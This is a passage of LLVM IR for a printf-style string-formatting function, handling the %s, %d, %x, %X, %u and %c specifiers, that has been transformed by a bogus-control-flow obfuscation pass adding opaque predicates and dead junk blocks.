  br i1 %81, label %82, label %87

; <label>:82:                                     ; preds = %77
  %83 = load i8*, i8** %5, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %5, align 8
  %85 = load i32, i32* %8, align 4
  %86 = or i32 %85, 2
  store i32 %86, i32* %8, align 4
  br label %77

; <label>:87:                                     ; preds = %77
  br label %88

; <label>:88:                                     ; preds = %125, %87
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp sge i32 %91, 48
  br i1 %92, label %93, label %98

; <label>:93:                                     ; preds = %88
  %94 = load i8*, i8** %5, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp sle i32 %96, 57
  br label %98

; <label>:98:                                     ; preds = %93, %88
  %99 = phi i1 [ false, %88 ], [ %97, %93 ]
  br i1 %99, label %100, label %128

; <label>:100:                                    ; preds = %98
  %101 = load i32, i32* @x.31
  %102 = load i32, i32* @y.32
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %100
  %109 = load i32, i32* %7, align 4
  %110 = mul nsw i32 %109, 10
  store i32 %110, i32* %7, align 4
  %111 = load i8*, i8** %5, align 8
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = sub nsw i32 %113, 48
  %115 = load i32, i32* %7, align 4
  %116 = add nsw i32 %115, %114
  store i32 %116, i32* %7, align 4
  %117 = load i32, i32* @x.31
  %118 = load i32, i32* @y.32
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart225, label %originalBB6alteredBB

originalBBpart225:                                ; preds = %originalBB6
  br label %125

; <label>:125:                                    ; preds = %originalBBpart225
  %126 = load i8*, i8** %5, align 8
  %127 = getelementptr inbounds i8, i8* %126, i32 1
  store i8* %127, i8** %5, align 8
  br label %88

; <label>:128:                                    ; preds = %98
  %129 = load i8*, i8** %5, align 8
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 115
  br i1 %132, label %133, label %198

; <label>:133:                                    ; preds = %128
  %134 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %135 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %134, i32 0, i32 0
  %136 = load i32, i32* %135, align 8
  %137 = icmp ule i32 %136, 40
  br i1 %137, label %138, label %144

; <label>:138:                                    ; preds = %133
  %139 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %134, i32 0, i32 3
  %140 = load i8*, i8** %139, align 8
  %141 = getelementptr i8, i8* %140, i32 %136
  %142 = bitcast i8* %141 to i64*
  %143 = add i32 %136, 8
  store i32 %143, i32* %135, align 8
  br label %165

; <label>:144:                                    ; preds = %133
  %145 = load i32, i32* @x.31
  %146 = load i32, i32* @y.32
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %144
  %153 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %134, i32 0, i32 2
  %154 = load i8*, i8** %153, align 8
  %155 = bitcast i8* %154 to i64*
  %156 = getelementptr i8, i8* %154, i32 8
  store i8* %156, i8** %153, align 8
  %157 = load i32, i32* @x.31
  %158 = load i32, i32* @y.32
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %165

; <label>:165:                                    ; preds = %originalBBpart229, %138
  %166 = phi i64* [ %142, %138 ], [ %155, %originalBBpart229 ]
  %167 = load i64, i64* %166, align 8
  %168 = inttoptr i64 %167 to i8*
  store i8* %168, i8** %11, align 8
  %169 = load i8**, i8*** %4, align 8
  %170 = load i8*, i8** %11, align 8
  %171 = icmp ne i8* %170, null
  br i1 %171, label %172, label %174

; <label>:172:                                    ; preds = %165
  %173 = load i8*, i8** %11, align 8
  br label %175

; <label>:174:                                    ; preds = %165
  br label %175

; <label>:175:                                    ; preds = %174, %172
  %176 = phi i8* [ %173, %172 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.333, i32 0, i32 0), %174 ]
  %177 = load i32, i32* @x.31
  %178 = load i32, i32* @y.32
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %175
  %185 = load i32, i32* %7, align 4
  %186 = load i32, i32* %8, align 4
  %187 = call i32 @prints(i8** %169, i8* %176, i32 %185, i32 %186)
  %188 = load i32, i32* %9, align 4
  %189 = add nsw i32 %188, %187
  store i32 %189, i32* %9, align 4
  %190 = load i32, i32* @x.31
  %191 = load i32, i32* @y.32
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart236, label %originalBB31alteredBB

originalBBpart236:                                ; preds = %originalBB31
  br label %522

; <label>:198:                                    ; preds = %128
  %199 = load i8*, i8** %5, align 8
  %200 = load i8, i8* %199, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 %201, 100
  br i1 %202, label %203, label %244

; <label>:203:                                    ; preds = %198
  %204 = load i32, i32* @x.31
  %205 = load i32, i32* @y.32
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %203
  %212 = load i8**, i8*** %4, align 8
  %213 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %214 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %213, i32 0, i32 0
  %215 = load i32, i32* %214, align 8
  %216 = icmp ule i32 %215, 40
  %217 = load i32, i32* @x.31
  %218 = load i32, i32* @y.32
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %216, label %225, label %231

; <label>:225:                                    ; preds = %originalBBpart240
  %226 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %213, i32 0, i32 3
  %227 = load i8*, i8** %226, align 8
  %228 = getelementptr i8, i8* %227, i32 %215
  %229 = bitcast i8* %228 to i32*
  %230 = add i32 %215, 8
  store i32 %230, i32* %214, align 8
  br label %236

; <label>:231:                                    ; preds = %originalBBpart240
  %232 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %213, i32 0, i32 2
  %233 = load i8*, i8** %232, align 8
  %234 = bitcast i8* %233 to i32*
  %235 = getelementptr i8, i8* %233, i32 8
  store i8* %235, i8** %232, align 8
  br label %236

; <label>:236:                                    ; preds = %231, %225
  %237 = phi i32* [ %229, %225 ], [ %234, %231 ]
  %238 = load i32, i32* %237, align 4
  %239 = load i32, i32* %7, align 4
  %240 = load i32, i32* %8, align 4
  %241 = call i32 @printi(i8** %212, i32 %238, i32 10, i32 1, i32 %239, i32 %240, i32 97)
  %242 = load i32, i32* %9, align 4
  %243 = add nsw i32 %242, %241
  store i32 %243, i32* %9, align 4
  br label %522

; <label>:244:                                    ; preds = %198
  %245 = load i32, i32* @x.31
  %246 = load i32, i32* @y.32
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %244
  %253 = load i8*, i8** %5, align 8
  %254 = load i8, i8* %253, align 1
  %255 = zext i8 %254 to i32
  %256 = icmp eq i32 %255, 120
  %257 = load i32, i32* @x.31
  %258 = load i32, i32* @y.32
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %256, label %265, label %290

; <label>:265:                                    ; preds = %originalBBpart244
  %266 = load i8**, i8*** %4, align 8
  %267 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %268 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %267, i32 0, i32 0
  %269 = load i32, i32* %268, align 8
  %270 = icmp ule i32 %269, 40
  br i1 %270, label %271, label %277

; <label>:271:                                    ; preds = %265
  %272 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %267, i32 0, i32 3
  %273 = load i8*, i8** %272, align 8
  %274 = getelementptr i8, i8* %273, i32 %269
  %275 = bitcast i8* %274 to i32*
  %276 = add i32 %269, 8
  store i32 %276, i32* %268, align 8
  br label %282

; <label>:277:                                    ; preds = %265
  %278 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %267, i32 0, i32 2
  %279 = load i8*, i8** %278, align 8
  %280 = bitcast i8* %279 to i32*
  %281 = getelementptr i8, i8* %279, i32 8
  store i8* %281, i8** %278, align 8
  br label %282

; <label>:282:                                    ; preds = %277, %271
  %283 = phi i32* [ %275, %271 ], [ %280, %277 ]
  %284 = load i32, i32* %283, align 4
  %285 = load i32, i32* %7, align 4
  %286 = load i32, i32* %8, align 4
  %287 = call i32 @printi(i8** %266, i32 %284, i32 16, i32 0, i32 %285, i32 %286, i32 97)
  %288 = load i32, i32* %9, align 4
  %289 = add nsw i32 %288, %287
  store i32 %289, i32* %9, align 4
  br label %522

; <label>:290:                                    ; preds = %originalBBpart244
  %291 = load i8*, i8** %5, align 8
  %292 = load i8, i8* %291, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp eq i32 %293, 88
  br i1 %294, label %295, label %352

; <label>:295:                                    ; preds = %290
  %296 = load i32, i32* @x.31
  %297 = load i32, i32* @y.32
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %295
  %304 = load i8**, i8*** %4, align 8
  %305 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %306 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 8
  %308 = icmp ule i32 %307, 40
  %309 = load i32, i32* @x.31
  %310 = load i32, i32* @y.32
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %308, label %317, label %323

; <label>:317:                                    ; preds = %originalBBpart248
  %318 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %305, i32 0, i32 3
  %319 = load i8*, i8** %318, align 8
  %320 = getelementptr i8, i8* %319, i32 %307
  %321 = bitcast i8* %320 to i32*
  %322 = add i32 %307, 8
  store i32 %322, i32* %306, align 8
  br label %344

; <label>:323:                                    ; preds = %originalBBpart248
  %324 = load i32, i32* @x.31
  %325 = load i32, i32* @y.32
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %323
  %332 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %305, i32 0, i32 2
  %333 = load i8*, i8** %332, align 8
  %334 = bitcast i8* %333 to i32*
  %335 = getelementptr i8, i8* %333, i32 8
  store i8* %335, i8** %332, align 8
  %336 = load i32, i32* @x.31
  %337 = load i32, i32* @y.32
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %344

; <label>:344:                                    ; preds = %originalBBpart252, %317
  %345 = phi i32* [ %321, %317 ], [ %334, %originalBBpart252 ]
  %346 = load i32, i32* %345, align 4
  %347 = load i32, i32* %7, align 4
  %348 = load i32, i32* %8, align 4
  %349 = call i32 @printi(i8** %304, i32 %346, i32 16, i32 0, i32 %347, i32 %348, i32 65)
  %350 = load i32, i32* %9, align 4
  %351 = add nsw i32 %350, %349
  store i32 %351, i32* %9, align 4
  br label %522

; <label>:352:                                    ; preds = %290
  %353 = load i8*, i8** %5, align 8
  %354 = load i8, i8* %353, align 1
  %355 = zext i8 %354 to i32
  %356 = icmp eq i32 %355, 117
  br i1 %356, label %357, label %414

; <label>:357:                                    ; preds = %352
  %358 = load i32, i32* @x.31
  %359 = load i32, i32* @y.32
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %357
  %366 = load i8**, i8*** %4, align 8
  %367 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %368 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %367, i32 0, i32 0
  %369 = load i32, i32* %368, align 8
  %370 = icmp ule i32 %369, 40
  %371 = load i32, i32* @x.31
  %372 = load i32, i32* @y.32
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %370, label %379, label %385

; <label>:379:                                    ; preds = %originalBBpart256
  %380 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %367, i32 0, i32 3
  %381 = load i8*, i8** %380, align 8
  %382 = getelementptr i8, i8* %381, i32 %369
  %383 = bitcast i8* %382 to i32*
  %384 = add i32 %369, 8
  store i32 %384, i32* %368, align 8
  br label %406

; <label>:385:                                    ; preds = %originalBBpart256
  %386 = load i32, i32* @x.31
  %387 = load i32, i32* @y.32
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %385
  %394 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %367, i32 0, i32 2
  %395 = load i8*, i8** %394, align 8
  %396 = bitcast i8* %395 to i32*
  %397 = getelementptr i8, i8* %395, i32 8
  store i8* %397, i8** %394, align 8
  %398 = load i32, i32* @x.31
  %399 = load i32, i32* @y.32
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %406

; <label>:406:                                    ; preds = %originalBBpart260, %379
  %407 = phi i32* [ %383, %379 ], [ %396, %originalBBpart260 ]
  %408 = load i32, i32* %407, align 4
  %409 = load i32, i32* %7, align 4
  %410 = load i32, i32* %8, align 4
  %411 = call i32 @printi(i8** %366, i32 %408, i32 10, i32 0, i32 %409, i32 %410, i32 97)
  %412 = load i32, i32* %9, align 4
  %413 = add nsw i32 %412, %411
  store i32 %413, i32* %9, align 4
  br label %522

; <label>:414:                                    ; preds = %352
  %415 = load i8*, i8** %5, align 8
  %416 = load i8, i8* %415, align 1
  %417 = zext i8 %416 to i32
  %418 = icmp eq i32 %417, 99
  br i1 %418, label %419, label %480

; <label>:419:                                    ; preds = %414
  %420 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %421 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 8
  %423 = icmp ule i32 %422, 40
  br i1 %423, label %424, label %446

; <label>:424:                                    ; preds = %419
  %425 = load i32, i32* @x.31
  %426 = load i32, i32* @y.32
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %424
  %433 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %420, i32 0, i32 3
  %434 = load i8*, i8** %433, align 8
  %435 = getelementptr i8, i8* %434, i32 %422
  %436 = bitcast i8* %435 to i32*
  %437 = add i32 %422, 8
  store i32 %437, i32* %421, align 8
  %438 = load i32, i32* @x.31
  %439 = load i32, i32* @y.32
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBBpart271, label %originalBB62alteredBB

originalBBpart271:                                ; preds = %originalBB62
  br label %451

; <label>:446:                                    ; preds = %419
  %447 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %420, i32 0, i32 2
  %448 = load i8*, i8** %447, align 8
  %449 = bitcast i8* %448 to i32*
  %450 = getelementptr i8, i8* %448, i32 8
  store i8* %450, i8** %447, align 8
  br label %451

; <label>:451:                                    ; preds = %446, %originalBBpart271
  %452 = phi i32* [ %436, %originalBBpart271 ], [ %449, %446 ]
  %453 = load i32, i32* @x.31
  %454 = load i32, i32* @y.32
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %451
  %461 = load i32, i32* %452, align 4
  %462 = trunc i32 %461 to i8
  %463 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %462, i8* %463, align 1
  %464 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %464, align 1
  %465 = load i8**, i8*** %4, align 8
  %466 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %467 = load i32, i32* %7, align 4
  %468 = load i32, i32* %8, align 4
  %469 = call i32 @prints(i8** %465, i8* %466, i32 %467, i32 %468)
  %470 = load i32, i32* %9, align 4
  %471 = add nsw i32 %470, %469
  store i32 %471, i32* %9, align 4
  %472 = load i32, i32* @x.31
  %473 = load i32, i32* @y.32
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBBpart282, label %originalBB73alteredBB

originalBBpart282:                                ; preds = %originalBB73
  br label %522

; <label>:480:                                    ; preds = %414
  br label %521

; <label>:481:                                    ; preds = %17
  %482 = load i32, i32* @x.31
  %483 = load i32, i32* @y.32
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %481
  %490 = load i32, i32* @x.31
  %491 = load i32, i32* @y.32
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %498

; <label>:498:                                    ; preds = %originalBBpart286, %51
  %499 = load i32, i32* @x.31
  %500 = load i32, i32* @y.32
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %498
  %507 = load i8**, i8*** %4, align 8
  %508 = load i8*, i8** %5, align 8
  %509 = load i8, i8* %508, align 1
  %510 = zext i8 %509 to i32
  call void @printchar(i8** %507, i32 %510)
  %511 = load i32, i32* %9, align 4
  %512 = add nsw i32 %511, 1
  store i32 %512, i32* %9, align 4
  %513 = load i32, i32* @x.31
  %514 = load i32, i32* @y.32
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBBpart292, label %originalBB88alteredBB

originalBBpart292:                                ; preds = %originalBB88
  br label %521

; <label>:521:                                    ; preds = %originalBBpart292, %480
  br label %522

; <label>:522:                                    ; preds = %521, %originalBBpart282, %406, %344, %282, %236, %originalBBpart236
  %523 = load i8*, i8** %5, align 8
  %524 = getelementptr inbounds i8, i8* %523, i32 1
  store i8* %524, i8** %5, align 8
  br label %12

; <label>:525:                                    ; preds = %45, %12
  %526 = load i8**, i8*** %4, align 8
  %527 = icmp ne i8** %526, null
  br i1 %527, label %528, label %531

; <label>:528:                                    ; preds = %525
  %529 = load i8**, i8*** %4, align 8
  %530 = load i8*, i8** %529, align 8
  store i8 0, i8* %530, align 1
  br label %531

; <label>:531:                                    ; preds = %528, %525
  %532 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %533 = bitcast %struct.__va_list_tag* %532 to i8*
  call void @llvm.va_end(i8* %533)
  %534 = load i32, i32* %9, align 4
  ret i32 %534

originalBBalteredBB:                              ; preds = %originalBB, %22
  %535 = load i8*, i8** %5, align 8
  %536 = getelementptr inbounds i8, i8* %535, i32 1
  store i8* %536, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %537 = load i8*, i8** %5, align 8
  %538 = load i8, i8* %537, align 1
  %539 = zext i8 %538 to i32
  %540 = icmp eq i32 %539, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %100
  %541 = load i32, i32* %7, align 4
  %_ = sub i32 %541, 10
  %gen = mul i32 %_, 10
  %_7 = sub i32 0, %541
  %gen8 = add i32 %_7, 10
  %_9 = sub i32 0, %541
  %gen10 = add i32 %_9, 10
  %_11 = shl i32 %541, 10
  %_12 = sub i32 %541, 10
  %gen13 = mul i32 %_12, 10
  %_14 = shl i32 %541, 10
  %_15 = sub i32 %541, 10
  %gen16 = mul i32 %_15, 10
  %542 = mul nsw i32 %541, 10
  store i32 %542, i32* %7, align 4
  %543 = load i8*, i8** %5, align 8
  %544 = load i8, i8* %543, align 1
  %545 = zext i8 %544 to i32
  %_17 = sub i32 %545, 48
  %gen18 = mul i32 %_17, 48
  %546 = sub nsw i32 %545, 48
  %547 = load i32, i32* %7, align 4
  %_19 = shl i32 %547, %546
  %_20 = sub i32 0, %547
  %gen21 = add i32 %_20, %546
  %_22 = sub i32 %547, %546
  %gen23 = mul i32 %_22, %546
  %548 = add nsw i32 %547, %546
  store i32 %548, i32* %7, align 4
  br label %originalBB6

originalBB27alteredBB:                            ; preds = %originalBB27, %144
  %549 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %134, i32 0, i32 2
  %550 = load i8*, i8** %549, align 8
  %551 = bitcast i8* %550 to i64*
  %552 = getelementptr i8, i8* %550, i32 8
  store i8* %552, i8** %549, align 8
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %175
  %553 = load i32, i32* %7, align 4
  %554 = load i32, i32* %8, align 4
  %555 = call i32 @prints(i8** %169, i8* %176, i32 %553, i32 %554)
  %556 = load i32, i32* %9, align 4
  %_32 = shl i32 %556, %555
  %_33 = shl i32 %556, %555
  %_34 = shl i32 %556, %555
  %557 = add nsw i32 %556, %555
  store i32 %557, i32* %9, align 4
  br label %originalBB31

originalBB38alteredBB:                            ; preds = %originalBB38, %203
  %558 = load i8**, i8*** %4, align 8
  %559 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %560 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %559, i32 0, i32 0
  %561 = load i32, i32* %560, align 8
  %562 = icmp ule i32 %561, 40
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %244
  %563 = load i8*, i8** %5, align 8
  %564 = load i8, i8* %563, align 1
  %565 = zext i8 %564 to i32
  %566 = icmp eq i32 %565, 120
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %295
  %567 = load i8**, i8*** %4, align 8
  %568 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %569 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %568, i32 0, i32 0
  %570 = load i32, i32* %569, align 8
  %571 = icmp ule i32 %570, 40
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %323
  %572 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %305, i32 0, i32 2
  %573 = load i8*, i8** %572, align 8
  %574 = bitcast i8* %573 to i32*
  %575 = getelementptr i8, i8* %573, i32 8
  store i8* %575, i8** %572, align 8
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %357
  %576 = load i8**, i8*** %4, align 8
  %577 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %578 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %577, i32 0, i32 0
  %579 = load i32, i32* %578, align 8
  %580 = icmp ule i32 %579, 40
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %385
  %581 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %367, i32 0, i32 2
  %582 = load i8*, i8** %581, align 8
  %583 = bitcast i8* %582 to i32*
  %584 = getelementptr i8, i8* %582, i32 8
  store i8* %584, i8** %581, align 8
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %424
  %585 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %420, i32 0, i32 3
  %586 = load i8*, i8** %585, align 8
  %587 = getelementptr i8, i8* %586, i32 %422
  %588 = bitcast i8* %587 to i32*
  %_63 = shl i32 %422, 8
  %_64 = sub i32 0, %422
  %gen65 = add i32 %_64, 8
  %_66 = sub i32 0, %422
  %gen67 = add i32 %_66, 8
  %_68 = sub i32 0, %422
  %gen69 = add i32 %_68, 8
  %589 = add i32 %422, 8
  store i32 %589, i32* %421, align 8
  br label %originalBB62

originalBB73alteredBB:                            ; preds = %originalBB73, %451
  %590 = load i32, i32* %452, align 4
  %591 = trunc i32 %590 to i8
  %592 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %591, i8* %592, align 1
  %593 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %593, align 1
  %594 = load i8**, i8*** %4, align 8
  %595 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %596 = load i32, i32* %7, align 4
  %597 = load i32, i32* %8, align 4
  %598 = call i32 @prints(i8** %594, i8* %595, i32 %596, i32 %597)
  %599 = load i32, i32* %9, align 4
  %_74 = sub i32 %599, %598
  %gen75 = mul i32 %_74, %598
  %_76 = sub i32 %599, %598
  %gen77 = mul i32 %_76, %598
  %_78 = sub i32 %599, %598
  %gen79 = mul i32 %_78, %598
  %_80 = shl i32 %599, %598
  %600 = add nsw i32 %599, %598
  store i32 %600, i32* %9, align 4
  br label %originalBB73

